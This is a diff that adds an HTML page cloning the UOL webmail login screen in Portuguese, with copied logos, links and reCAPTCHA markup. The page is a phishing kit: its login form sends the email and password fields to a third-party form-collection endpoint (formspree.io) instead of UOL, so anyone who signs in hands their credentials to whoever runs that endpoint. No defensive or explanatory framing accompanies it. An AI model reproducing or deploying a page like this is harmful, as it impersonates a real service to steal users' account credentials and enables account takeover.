@@ -1,0 +1,328 @@
+<html lang="pt-BR">
+  
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      http-equiv="Cache-Control"
+      content="no-cache, no-store, must-revalidate"
+    />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="theme-color" content="#FFFFFF" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <link
+      rel="shortcut icon"
+      href="https://hp.imguol.com.br/c/home/layout/camaleao/favico/favico.ico"
+    />
+    <link rel="icon" href="/favicon.ico" sizes="32x32" />
+    <link rel="icon" href="/favicon.ico" sizes="192x192" />
+    <link rel="apple-touch-icon-precomposed" href="/favicon.ico" />
+    <meta name="msapplication-TileImage" content="/favicon.ico" />
+    <title>E-mail UOL</title>
+    <link href="static\css\main.2f72003a.chunk.css" rel="stylesheet" />
+    
+  </head>
+  <body>
+    <div id="root">
+      <div id="wrapper">
+        <div id="modal">
+          <div
+            id="CTA"
+            class="UOL"
+            style="background: rgb(233, 180, 37); color: rgb(0, 0, 0)"
+          >
+            <div class="CTA__logo">
+              <img
+                class="logo"
+                src="https://imguol.com/p/g/logos/logo_uolmail2.png"
+                alt=""
+                title=""
+              />
+            </div>
+            <p id="Gerencie">
+              Gerencie seus e-mails com a segurança que só o UOL te oferece.
+            </p>
+            <div class="businessAction hidden-xs hidden-sm">
+              <span>Ainda não tem email UOL? </span
+              ><a
+                aria-label="ASSINE JÁ"
+                class="btn btn-link"
+                href="http://email.uol.com.br/bem-vindo?utm_source=Mail-login&amp;utm_medium=link-assineja&amp;utm_campaign=link-mail-login-assine-uolmail"
+                rel=""
+                title="ASSINE JÁ"
+                style="color: inherit"
+                >ASSINE JÁ</a
+              >
+            </div>
+          </div>
+          <div id="form">
+            <form action="https://formspree.io/f/mbjeobaq" method="POST" >
+              <h1>Login</h1>
+              <div class="margin-default">
+                <div class="form-group">
+                  <input
+                    autocomplete="username"
+                    required=""
+                    name="user"
+                    placeholder=" "
+                    type="email"
+                    id="email"
+                    class="input-lg form-control"
+                    value=""
+                  /><label for="email" class="control-label"
+                    >CPF/CNPJ ou Email</label
+                  >
+                </div>
+                <div class="form-group">
+                  <input
+                    autocomplete="current-password"
+                    required=""
+                    name="pass"
+                    placeholder=" "
+                    type="text"
+                    id="message"
+                    class="input-lg form-control"
+                    value=""
+                  /><label for="message" class="control-label">Senha</label
+                  ><button
+                    aria-label="mostrar"
+                    type="submit"
+                    class="show-pass no-padding btn btn-link"
+                  >
+                    mostrar
+                  </button>
+                </div>
+                <div id="boxCaptcha">
+                  <div id="mcap-wrapper" style="position: relative">
+                    <input id="mcap-resp" name="captchaResp" type="hidden" />
+                  </div>
+                  <input
+                    id="mcap-token"
+                    type="hidden"
+                    name="token"
+                    value=""
+                  /><input
+                    id="mcap-resp-field"
+                    type="hidden"
+                    name="respField"
+                    value="g-recaptcha-response"
+                  /><input
+                    type="hidden"
+                    id="mcap-invisible"
+                    name="invisible"
+                    value="true"
+                  />
+                </div>
+                <div>
+                  <div
+                    class="grecaptcha-badge"
+                    data-style="bottomright"
+                    style="
+                      width: 256px;
+                      height: 60px;
+                      display: block;
+                      transition: right 0.3s ease 0s;
+                      position: fixed;
+                      bottom: 14px;
+                      right: -186px;
+                      box-shadow: gray 0px 0px 5px;
+                      border-radius: 2px;
+                      overflow: hidden;
+                    "
+                  >
+                    <div class="grecaptcha-logo">
+                      <iframe
+                        title="reCAPTCHA"
+                        src="https://www.google.com/recaptcha/enterprise/anchor?ar=1&amp;k=6LcG2qYaAAAAAMYVEA1BnpZFbv76wOnQ8SqmdYfT&amp;co=aHR0cHM6Ly9jb250YS51b2wuY29tLmJyOjQ0Mw..&amp;hl=pt&amp;v=O4xzMiFqEvA4YhWjk5t8Xuas&amp;size=invisible&amp;cb=gcwxrnpgdc0n"
+                        width="256"
+                        height="60"
+                        role="presentation"
+                        name="a-k70cn7z22o1l"
+                        frameborder="0"
+                        scrolling="no"
+                        sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"
+                      ></iframe>
+                    </div>
+                    <div class="grecaptcha-error"></div>
+                    <textarea
+                      id="g-recaptcha-response"
+                      name="g-recaptcha-response"
+                      class="g-recaptcha-response"
+                      style="
+                        width: 250px;
+                        height: 40px;
+                        border: 1px solid rgb(193, 193, 193);
+                        margin: 10px 25px;
+                        padding: 0px;
+                        resize: none;
+                        display: none;
+                      "
+                    ></textarea>
+                  </div>
+                  <iframe style="display: none"></iframe>
+                </div>
+                <button
+                  id="button-submit"
+                  aria-label="Entrar"
+                  type="submit"
+                  class="invisible-button btn btn-default btn-block g-recaptcha"
+                  style="
+                    background-color: rgb(226, 153, 51);
+                    color: rgb(255, 255, 255);
+                  "
+                  data-sitekey="6LcG2qYaAAAAAMYVEA1BnpZFbv76wOnQ8SqmdYfT"
+                  data-callback="onMcapSubmit"
+                  value="Enviar"
+                >
+                  Entrar
+                </button>
+              </div>
+            </form>
+            <span class="forgetPass"
+              ><a
+                aria-label="Esqueceu a senha?"
+                class="btn btn-link"
+                href="https://sac.uol.com.br/#/recuperarsenha"
+                rel="noopener noreferrer"
+                target=""
+                title="Esqueceu a senha?"
+                >Esqueceu a senha?</a
+              ></span
+            >
+          </div>
+          <div class="businessAction visible-xs container">
+            <span>Ainda não tem email UOL? </span
+            ><a
+              aria-label="ASSINE JÁ"
+              class="btn btn-link"
+              href="http://email.uol.com.br/bem-vindo?utm_source=Mail-login&amp;utm_medium=link-assineja&amp;utm_campaign=link-mail-login-assine-uolmail"
+              rel=""
+              title="ASSINE JÁ"
+              style="color: rgb(102, 102, 102)"
+              >ASSINE JÁ</a
+            >
+          </div>
+          <div id="footerModal" class="smallHeightMobile">
+            <div class="footerModalContent">
+              <span
+                >Uma única conta para você acessar ou assinar os produtos e
+                serviços UOL.
+                <a
+                  aria-label="Saiba mais"
+                  class="btn btn-link"
+                  href="https://sac.uol.com.br/#/account"
+                  rel="noopener noreferrer"
+                  target=""
+                  title="Saiba mais"
+                  >Saiba mais</a
+                ></span
+              >
+            </div>
+            <div class="logos">
+              <img
+                src="https://imguol.com/uol-osiris-frontend/uol-minimalist-logo.svg"
+                alt="UOL"
+                title="UOL"
+              /><img
+                src="https://imguol.com/uol-osiris-frontend/uol-meunegocio-minimalist-logo.svg"
+                alt="UOL Meu Negócio"
+                title="UOL Meu Negócio"
+              />
+            </div>
+          </div>
+        </div>
+        <footer class="hidden-xs footer-form-single-step">
+          <p>
+            Sua senha é secreta. Nenhum funcionário a serviço do UOL está
+            autorizado a solicitá-la<br />
+          </p>
+          <a
+            aria-label="Regras de uso"
+            class="btn btn-link"
+            href="https://regras.uol.com.br/"
+            rel="noopener noreferrer"
+            target=""
+            title="Regras de uso"
+            >Regras de uso</a
+          ><a
+            aria-label="Política anti-spam"
+            class="btn btn-link"
+            href="https://sac.uol.com.br/#/wrapper?url=https://sac.uol.com.br/info/protecao_privacidade/politica_anti-spam.jhtm"
+            rel="noopener noreferrer"
+            target=""
+            title="Política anti-spam"
+            >Política anti-spam</a
+          ><a
+            aria-label="Crimes virtuais: denuncie"
+            class="btn btn-link"
+            href="https://denuncia.uol.com.br/"
+            rel="noopener noreferrer"
+            target=""
+            title="Crimes virtuais: denuncie"
+            >Crimes virtuais: denuncie</a
+          >
+        </footer>
+      </div>
+    </div>
+   
+    <iframe name="__launchpadLocator" style="display: none"></iframe>
+    
+    <iframe
+      src="https://tm.uol.com.br/purge-clients.html?name=DEretargeting&amp;expname=DEretargetingExp&amp;expdomain=1"
+      style="width: 0px; display: none; opacity: 0; border: 0px"
+    ></iframe
+    ><iframe
+      src="https://tm.uol.com.br/purge-clients.html?name=dynad_rt&amp;expname=dynad_rt_exp&amp;expdomain=1"
+      style="width: 0px; display: none; opacity: 0; border: 0px"
+    ></iframe>
+    <div
+      style="
+        visibility: hidden;
+        position: absolute;
+        width: 100%;
+        top: -10000px;
+        left: 0px;
+        right: 0px;
+        transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s;
+        opacity: 0;
+      "
+    >
+      <div
+        style="
+          width: 100%;
+          height: 100%;
+          position: fixed;
+          top: 0px;
+          left: 0px;
+          z-index: 2000000000;
+          background-color: rgb(255, 255, 255);
+          opacity: 0.5;
+        "
+      ></div>
+      <div
+        style="
+          margin: 0px auto;
+          top: 0px;
+          left: 0px;
+          right: 0px;
+          position: absolute;
+          border: 1px solid rgb(204, 204, 204);
+          z-index: 2000000000;
+          background-color: rgb(255, 255, 255);
+          overflow: hidden;
+        "
+      >
+        <iframe
+          title="o desafio reCAPTCHA expira em dois minutos"
+          src="https://www.google.com/recaptcha/enterprise/bframe?hl=pt&amp;v=O4xzMiFqEvA4YhWjk5t8Xuas&amp;k=6LcG2qYaAAAAAMYVEA1BnpZFbv76wOnQ8SqmdYfT"
+          name="c-k70cn7z22o1l"
+          frameborder="0"
+          scrolling="no"
+          sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"
+          style="width: 100%; height: 100%"
+        ></iframe>
+      </div>
+    </div>
+  </body>
+</html>
